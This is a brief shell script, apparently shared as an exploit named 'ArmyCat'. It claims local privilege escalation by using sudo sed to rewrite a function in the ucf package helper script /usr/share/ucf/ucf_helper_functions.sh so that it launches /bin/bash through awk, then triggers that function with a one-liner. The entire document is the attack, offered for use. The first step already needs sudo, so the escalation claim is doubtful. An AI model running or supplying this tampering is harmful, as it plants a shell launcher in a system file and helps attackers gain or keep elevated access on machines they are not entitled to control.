# ArmyCat - another script editing LPE.

# Edit the script 
sudo sed -i '/handle_deleted_ucf_file()/,/locfile=/ { /if \[-n/,/fi/c\  awk '\''BEGIN {system("/bin/bash")}'\''; locfile="$1"
}' /usr/share/ucf/ucf_helper_functions.sh

# Trigger the LPE - somehow a one-liner, LOLFAO.
sudo ucfr fpkg /tmp/fpkg.conf; . /usr/share/ucf/ucf_helper_functions.sh; PKGNAME=fpkg handle_deleted_ucf_file "/tmp/fpkg.conf" "/tmp/fpkgdir" "/tmp"
